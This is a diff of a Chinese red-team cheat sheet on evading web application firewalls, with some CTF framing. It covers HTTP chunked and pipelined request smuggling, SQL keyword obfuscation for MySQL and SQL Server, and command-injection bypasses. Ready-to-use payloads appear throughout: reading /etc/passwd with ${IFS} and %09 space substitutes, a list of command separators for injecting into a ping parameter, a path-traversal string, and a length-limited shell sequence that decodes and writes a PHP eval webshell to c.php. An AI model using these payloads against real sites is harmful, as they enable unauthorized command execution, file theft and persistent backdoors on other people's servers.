@@ -1,4 +1,4 @@
-# Bypass_WAF
+# Bypass 技巧
 
 ---
 
@@ -21,7 +21,7 @@
 
 ---
 
-**文章**
+**相关文章 & Source & Reference**
 - [██大学通用型 WAF 不完全绕过(持续非定期更新) ](https://drivertom.blogspot.com/2018/12/waf.html)
 - [技术讨论 | 在 HTTP 协议层面绕过 WAF](https://www.freebuf.com/news/193659.html)
 - [利用分块传输吊打所有 WAF](https://www.anquanke.com/post/id/169738)
@@ -34,16 +34,17 @@
 - [简单绕过waf拿下赌博网站](https://xz.aliyun.com/t/9181) - 利用 JavaScript 转写 php
 - [从shiro-550漏洞品阿里云waf规则引擎](https://mp.weixin.qq.com/s/qF7Jgiev5B7zLEHwGXry3A)
 - [你的扫描器可以绕过防火墙么？（一）](https://paper.seebug.org/1600/)
+- [CTF中的命令执行绕过](https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw)
 
 **导图**
-- WAF绕过思路 [png](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/WAF绕过思路.png)
+- WAF绕过思路 [png](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/WAF绕过思路.png)
 
 **payload**
 - [devploit/XORpass](https://github.com/devploit/XORpass#example-of-bypass) - 使用XOR编码器绕过 WAF
 
 ---
 
-# 匹配绕过
+## 匹配绕过
 
 **关键字替换**
 
@@ -150,7 +151,7 @@ payload: `.././.././.././.././.././.././.././.././.././.././.././etc/./passwd`
 
 ---
 
-# 分段传输
+## 分段传输
 
 **利用 pipline 绕过**
 - **原理**
@@ -160,17 +161,17 @@ payload: `.././.././.././.././.././.././.././.././.././.././.././etc/./passwd`
 - **测试**
 
     关闭 burp 的 Repeater 的 Content-Length 自动更新,如图所示,点击红圈的 Repeater 在下拉选项中取消 update Content-Length 选中.这一步至关重要!!!
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/1.png)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/1.png)
 
     burp 截获 post 提交
 
     `id=1 and 1=1` 会被 waf,将数据包复制一遍,如图
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/2.png)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/2.png)
 
     接着修改第一个数据包的数据部分,即将 `id=1+and+1%3D1` 修改为正常内容 `id=1`,再将数据包的 Content-Length 的值设置为修改后的 `id=1` 的字符长度即 4,最后将 Connection 字段值设为 keep-alive.提交后如图所示,会返回两个响应包,分别对应两个请求.
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/3.png)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/3.png)
 
     注意:从结果看,第一个正常数据包返回了正确内容,第二个包含 Payload 的数据包被某狗 waf 拦截,说明两数据包都能到达服务器,在面对其他 waf 时有可能可以绕过.无论如何这仍是一种可学习了解的绕过方法,且可以和接下来的方法进行组合使用绕过.
 
@@ -180,7 +181,7 @@ payload: `.././.././.././.././.././.././.././.././.././.././.././etc/./passwd`
     在头部加入 Transfer-Encoding: chunked 之后,就代表这个报文采用了分块编码.这时,post 请求报文中的数据部分需要改为用一系列分块来传输.每个分块包含十六进制的长度值和数据,长度值独占一行,长度不包括它结尾的,也不包括分块数据结尾的,且最后需要用 0 独占一行表示结束.
 
     开启上个实验中已关闭的 content-length 自动更新.给 post 请求包加入 Transfer-Encoding: chunked 后,将数据部分 `id=1 and 1=1` 进行分块编码(注意长度值必须为十六进制数),每一块里长度值独占一行,数据占一行如图所示.
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/4.png)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/4.png)
 
     注意:分块编码传输需要将关键字 and,or,select ,union 等关键字拆开编码,不然仍然会被 waf 拦截.编码过程中长度需包括空格的长度.最后用 0 表示编码结束,并在 0 后空两行表示数据包结束,不然点击提交按钮后会看到一直处于 waiting 状态.
 
@@ -190,7 +191,7 @@ payload: `.././.././.././.././.././.././.././.././.././.././.././etc/./passwd`
     HTTP 头里的 Content-Type 一般有 application/x-www-form-urlencoded,multipart/form-data,text/plain 三种,其中 multipart/form-data 表示数据被编码为一条消息,页上的每个控件对应消息中的一个部分.所以,当 waf 没有规则匹配该协议传输的数据时可被绕过.
 
     将头部 Content-Type 改为 `multipart/form-data; boundary=69` 然后设置分割符内的 Content-Disposition 的 name 为要传参数的名称.数据部分则放在分割结束符上一行.
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/5.png)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/5.png)
 
     由于是正常数据提交,所以从图可知数据是能被 apache 容器正确解析的,尝试 `1 and 1=1` 也会被某狗 waf 拦截,但如果其他 waf 没有规则拦截这种方式提交的数据包,那么同样能绕过.
 
@@ -200,7 +201,7 @@ payload: `.././.././.././.././.././.././.././.././.././.././.././etc/./passwd`
 
 在协议未覆盖的数据包中加入 Transfer-Encoding: chunked ,然后将数据部分全部进行分块编码,如图所示(数据部分为 `1 and 1=1` ).
 
-![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/6.png)
+![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/6.png)
 
 注意:第2块,第3块,第7块,和第8块.
 
@@ -255,55 +256,7 @@ Content-Disposition: name="id"
 
 ---
 
-# 长度
-
-**Linux**
-```
-w>hp\\
-w>c.p\\
-w>d\>\\
-w>\ -\\
-w>e64\\
-w>bas\\
-w>7\|\\
-w>XSk\\
-w>Fsx\\
-w>dFV\\
-w>kX0\\
-w>bCg\\
-w>XZh\\
-w>AgZ\\
-w>waH\\
-w>PD9\\
-w>o\ \\
-w>ech\\
-ls -t>ls
-sh ls
-```
-
-- w 长度最短的命令
-- ls -t 以创建时间来列出当前目录下所有文件
-- 文件列表以[ [ 换 行符] ]分割每个文件
-- 引入 `\` 转义ls时的换行
-- 换行不影响命令执行
-- 成功构造任意命令执行,写入Webshell
-```bash
-ls -t
-echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 | base64 -d>c.php
-```
-
----
-
-# 来源
-
-![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/7.jpg)
-
-- [Fuzz_head](https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/HTTP/Fuzz_head.txt)
-- [How to hack a company by circumventing its WAF through the abuse of a different security appliance and win bug bounties](https://www.redtimmy.com/web-application-hacking/how-to-hack-a-company-by-circumventing-its-waf-through-the-abuse-of-a-different-security-appliance-and-win-bug-bounties/) - 利用 ssrf "借刀杀人"
-
----
-
-# 性能角度
+## 性能角度
 
 **性能检测**
 
@@ -336,34 +289,34 @@ OpenResty 通过ngx.req.get_uri_args、ngx.req.get_post_args获取参数，只�
 
 ---
 
-# POST
+## POST
 
 urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种方式是使用 urlencode 的方式提交,第二种方式是使用 form-data 的方式提交.当我们在测试站点的时候,如果发现 POST 提交的数据被过滤掉了,此时可以考虑使用 form-data 的方式去提交.
 
 创建一个存在 sql 注入漏洞的页面,获取参数从 POST 上获取,首先以 urlencode 的方式提交,查看发现提交的请求被阻断了.其次以 form-data 的方式提交,发现爆出了数据库的版本.
 
-![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/8.png)
+![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/8.png)
 
 ---
 
-# MYSQL
+## MYSQL
 
 **参数和 union 之间的位置**
 - `\Nunion` 的形式
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/9.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/9.jpg)
 
 - 浮点数的形式如 1.1,8.0
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/10.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/10.jpg)
 
 - 8e0 的形式
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/11.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/11.jpg)
 
 - 利用 `/*!50000*/` 的形式
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/12.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/12.jpg)
 
 **union 和 select 之前的位置**
 - 空白字符
@@ -380,92 +333,92 @@ urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种�
 
 - 使用括号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/13.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/13.jpg)
 
 **union select 后的位置**
 - 空白字符
 - 注释
 - 括号:select(1)from
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/14.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/14.jpg)
 
 - 减号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/15.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/15.jpg)
 
 - 加号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/16.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/16.jpg)
 
 - `~` 号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/17.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/17.jpg)
 
 - `!` 号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/18.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/18.jpg)
 
 - `@` 形式
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/19.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/19.jpg)
 
 - `*` 号,利用 /*!50000*/ 的形式
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/20.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/20.jpg)
 
 - 单引号和双引号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/21.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/21.jpg)
 
 - `{` 括号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/22.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/22.jpg)
 
 - `\N` 符号:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/23.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/23.jpg)
 
 **select from 之间的位置**
 - 空白字符
 - 注释
 - ``
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/24.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/24.jpg)
 
 - `+,-,!,~,’"`
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/25.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/25.jpg)
 
 - `*` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/26.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/26.jpg)
 
 - `{` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/27.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/27.jpg)
 
 - `(` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/28.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/28.jpg)
 
 **select from 之后的位置**
 - 空白字符
 - 注释
 - `` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/29.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/29.jpg)
 
 - `*` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/30.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/30.jpg)
 
 - `{` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/31.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/31.jpg)
 
 - 括号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/32.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/32.jpg)
 
 **过滤函数**
 - 字符串截取函数
@@ -510,11 +463,11 @@ urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种�
 
     通过 join 拼接.
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/33.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/33.jpg)
 
 ---
 
-# sqlserver
+## sqlserver
 
 **select from 后的位置**
 - 空白符号
@@ -529,11 +482,11 @@ urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种�
 
 - `.` 符号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/34.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/34.jpg)
 
 - `:` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/35.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/35.jpg)
 
 **select from 之间的位置**
 - 空白符号
@@ -546,7 +499,7 @@ urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种�
 - `:` 号
 - `%2b` 号
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/36.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/36.jpg)
 
 **常见过滤函数**
 - 字符串截取函数
@@ -566,8 +519,109 @@ urlencode 和 form-data POST 在提交数据的时候有两种方式,第一种�
 
     使用 exec 的方式:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/37.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/37.jpg)
 
     使用 sp_executesql 的方式:
 
-    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass_WAF/38.jpg)
+    ![](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/38.jpg)
+
+---
+
+## 命令执行
+
+### 空格代替
+
+空格在bash下，可以用以下字符代替空格
+```
+<
+${IFS}
+$IFS$9
+%09
+```
+
+```
+cat</etc/passwd
+cat${IFS}/etc/passwd
+cat$IFS$9/etc/passwd
+cat%09/etc/passwd
+```
+
+$IFS 在 linux 下表示分隔符，只有 cat$IFSa.txt 的时候, bash 解释器会把整个 IFSa 当做变量名，所以导致没有办法运行，然而如果加一个 {} 就固定了变量名，同理在后面加个 $ 可以起到截断的作用，而 $9 指的是当前系统 shell 进程的第九个参数的持有者，就是一个空字符串，因此 $9 相当于没有加东西，等于做了一个前后隔离。
+
+### 截断符号
+
+比如测试 ping 功能的点，要求填写一个 ip 参数这样的题目，这个时候就需要测试截断符号，将你输入的 ip 参数和后面要执行的命令隔开。首先测试所有的截断符号：
+```
+$
+;
+|
+-
+(
+)
+`
+||
+&&
+&
+}
+{
+%0a
+```
+
+利用截断符号配合普通命令简单问题基本就出来；例如：ip=127.0.0.1;cat /home/flag.txt 这样就可以达到同时执行两条命令的效果
+
+### 利用base编码绕过
+
+这种绕过针对的是系统过滤敏感字符的时候，比如他过滤了cat命令，那么就可以用下面这种方式将cat先base64编码后再进行解码运行。
+```
+echo 'cat' | base64
+
+`echo 'Y2F0Cg==' | base64 -d` /etc/passwd
+```
+
+### 单引号
+
+```
+cat /etc/pass'w'd
+```
+
+### 反斜杠利用
+
+linux 下创建文件的命令可以用 `1>1` 创建文件名为 1 的空文件
+
+`ls>1` 可以直接把 ls 的内容导入一个文件中, 但是会默认追加 \n
+
+**Linux**
+```
+w>hp\\
+w>c.p\\
+w>d\>\\
+w>\ -\\
+w>e64\\
+w>bas\\
+w>7\|\\
+w>XSk\\
+w>Fsx\\
+w>dFV\\
+w>kX0\\
+w>bCg\\
+w>XZh\\
+w>AgZ\\
+w>waH\\
+w>PD9\\
+w>o\ \\
+w>ech\\
+ls -t>ls
+sh ls
+```
+
+- w 长度最短的命令
+- ls -t 以创建时间来列出当前目录下所有文件
+- 文件列表以[ [ 换 行符] ]分割每个文件
+- 引入 `\` 转义ls时的换行
+- 换行不影响命令执行
+- 成功构造任意命令执行,写入Webshell
+
+```bash
+ls -t
+echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 | base64 -d>c.php
+```
